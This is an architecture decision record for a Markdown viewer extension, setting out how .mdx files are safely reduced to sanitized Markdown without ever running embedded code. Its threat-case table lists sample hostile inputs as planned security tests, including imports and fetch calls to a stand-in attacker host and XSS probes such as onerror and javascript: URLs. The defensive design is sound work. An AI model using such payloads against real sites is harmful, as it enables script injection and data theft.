# ADR-0008: MDX Handling & Safe-Degradation Strategy

- Status: Accepted
- Date: 2026-09-08
- Related: `docs/specs/01-functional-requirements.md` §2, §3, §40;
  `docs/specs/04-security-privacy.md` §2, §3;
  `docs/specs/06-testing-quality-gate.md` §3; ADR-0002 (sanitize-before-insert
  rule); feature matrix F09, F68, F01

## Context

`.mdx` is a first-class supported extension (F01) and
`01-functional-requirements.md` §3 states the requirement plainly: never
execute embedded JavaScript or JSX, extract and render the Markdown-compatible
portions, fall back to a visible placeholder rather than a crash, with the
priority order **safety > useful output > full fidelity**.

MDX source can contain three things ordinary Markdown cannot:

1. ESM statements — `import Chart from './chart'`, `export const meta = {...}`.
2. JSX elements — `<Tabs>`, `<Card title="x" onClick={fn} />`, including
   React-specific attributes like `dangerouslySetInnerHTML`.
3. Brace expressions — `{new Date().toString()}`, `{/* comment */}`.

The real MDX toolchain compiles all of this into an executable JavaScript
module. Running that compiler — even without executing its output — is not
acceptable here: it is a large dependency whose entire purpose is producing
code, on a code path fed by untrusted remote input, inside an extension whose
CSP forbids `eval` precisely so that this class of mistake is impossible.

Until now the strategy existed only as a single bullet in the implementation
plan (Phase 2), whose citation pointed at a "Key technical findings" section
that does not exist in the repository. This ADR replaces that dangling
reference and makes the strategy reviewable and testable.

## Decision

### 1. A text pre-pass, never a compiler

`.mdx` input is transformed by a **pre-parse text transform** in
`src/viewer/markdown/mdx/`, producing plain Markdown that is then fed to the
ordinary markdown-it pipeline and, as always, through DOMPurify before it
touches the DOM (`04-security-privacy.md` §3 — the MDX path gets **no
sanitizer bypass and no separate render path**).

No `@mdx-js/*` package, no `new Function`, no `eval`, no dynamic `import()`,
at any point. The transform is pure string→string and is unit-testable in
isolation.

### 2. Trigger scope

The pre-pass runs **only** when the source is identified as MDX by file
extension (`.mdx`) or by an explicit user action ("treat as MDX"). Ordinary
`.md`/`.markdown`/`.txt` documents are never put through it — brace and
angle-bracket handling that is helpful for MDX would otherwise mangle
legitimate Markdown, LaTeX (`$\{x\}$`), and code samples.

### 3. Transform rules, in order

Applied outside fenced code blocks, inline code spans, and math delimiters —
those regions are extracted and restored verbatim so nothing inside a code
sample or a formula is ever rewritten.

| # | Construct | Handling |
|---|---|---|
| 1 | YAML front matter | Preserved untouched and handed to the front-matter card (F43) |
| 2 | `import …` / `export …` statements at the start of a top-level line, including multi-line `{ a, b }` specifier lists and `export const x = {…}` | **Removed** (consumed to the end of the statement, brace-balanced). Nothing is rendered in their place |
| 3 | JSX element whose tag name is **lowercase and in the safe-HTML allowlist** (`div`, `span`, `img`, `a`, `table`, …) | Left in place as HTML for markdown-it; DOMPurify remains the arbiter of its attributes |
| 4 | JSX element whose tag name is **capitalized** (a component: `<Tabs>`, `<Card>`) — paired form | **Tag stripped, inner content kept** and rendered as Markdown. This is the same graceful-degradation behaviour F68 requires for Mintlify-style components |
| 5 | Same, **self-closing** (`<Callout type="warn" />`) | Replaced with a visible, styled "unsupported component: `Callout`" placeholder chip — satisfies §3's "visible placeholder, not a crash" |
| 6 | **All attributes on a stripped component tag** (rules 4–5) | Discarded entirely, never rendered and never carried into the output — including `onClick={…}`, `dangerouslySetInnerHTML={…}`, `style={…}` |
| 7 | `{/* … */}` MDX comments | Removed (they are comments; leaving them would render visible brace noise) |
| 8 | Any other `{ … }` brace expression | **Left as literal text.** It is not evaluated, not treated as code, and not specially escaped beyond normal Markdown/HTML escaping — braces are inert in HTML, so the safest handling is the one that does nothing clever |
| 9 | Lowercase tag *not* in the safe-HTML allowlist (e.g. `<script>`, `<iframe>`, `<object>`) | Left for DOMPurify, which strips it — the pre-pass never becomes a second, weaker sanitizer competing with the real one |

### 4. Failure behaviour

If the transform throws for any reason, the viewer renders the **raw MDX
source as a fenced code block** with an inline notice ("MDX could not be
interpreted; showing source"), using the project's standard inline-error
component. A blank screen is never an outcome
(`01-functional-requirements.md` §40).

### 5. Explicit non-goals for v1

- No component rendering, no props, no layouts, no `<MDXProvider>` semantics.
- No evaluation of expressions, ever — `{2+2}` renders as the four characters
  `{2+2}`, not `4`. Fidelity is deliberately sacrificed to keep the
  "documents are data" boundary absolute.

## Threat cases this defends against (all become Phase 2 security tests)

| Input | Expected result |
|---|---|
| `import evil from "https://attacker.example/x.js"` | Statement removed; no request made, nothing rendered |
| `export const x = () => fetch("https://attacker.example")` | Statement removed |
| `<Card onClick={fetch('https://attacker.example')}>Text</Card>` | Renders the word "Text"; attribute discarded by rule 6; zero network requests (asserted by a Playwright network assertion) |
| `<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />` | Not a valid HTML attribute; stripped by rules 6/9 + DOMPurify; nothing executes |
| `<img src="x" onerror="alert(1)" />` | Rendered as an `img` (rule 3), `onerror` stripped by DOMPurify |
| `{eval("alert(1)")}` | Rendered as literal text |
| `<script>alert(1)</script>` | Removed by DOMPurify (rule 9) |
| `<a href="javascript:alert(1)">x</a>` | `href` blocked by the sanitizer's URL-scheme allowlist (`04-security-privacy.md` §3) |
| Fenced code block containing `import x from 'y'` | Untouched — code regions are extracted before the transform and restored after |
| Unbalanced/garbage JSX (`<Card <<>`) | Transform either degrades to literal text or throws into the §4 source-fallback; never blanks the page |

## Consequences

- MDX support is honest but partial: component-heavy documents render as their
  readable text content plus placeholder chips. This must appear in the
  product's known-limitations list, not be implied as full MDX support.
- The transform is a regex/scanner over text, which is inherently approximate
  for a nested syntax. That is acceptable **only** because it is never the
  security boundary — DOMPurify is, and every path still passes through it.
  Any future proposal to let the pre-pass emit HTML that skips sanitization
  would be a new ADR-level decision, and the answer is expected to be no.
- Rules 4/5 give F68 (extended documentation-component syntax) its
  implementation for free: Mintlify-style components are just capitalized JSX
  tags, so one code path serves both features.
- Because the pre-pass runs before markdown-it, MDX documents get the entire
  rest of the pipeline unchanged — containers, alerts, math, diagrams,
  highlighting, TOC — with no MDX-specific branches downstream.

## Alternatives considered

- **Use the real MDX compiler and simply not execute the output**: rejected —
  a heavyweight dependency whose product is executable JavaScript, added to
  the untrusted-input path of a security-sensitive extension, for output we
  would then have to un-compile back into HTML. It also cannot run under the
  project's CSP without exactly the relaxations ADR-0002 refuses.
- **Render `.mdx` as plain text / refuse to render it**: rejected — `.mdx` is
  an advertised supported extension (F01), and most real-world `.mdx` files
  are 95% ordinary Markdown; showing raw source would fail the "useful output"
  priority for no additional safety, since safety is already provided by
  DOMPurify.
- **Strip *all* JSX including inner content**: rejected — silently deletes the
  document's actual prose whenever an author wrapped a section in a component,
  which is the common case in Mintlify/Docusaurus-style docs and would look
  like data loss.
- **Interpret simple brace expressions (e.g. front-matter variable
  substitution)**: rejected for v1 — it is the first step onto an evaluation
  path, and the value (rendering `{frontmatter.title}`) is small next to the
  cost of defending a mini-expression evaluator against untrusted input.
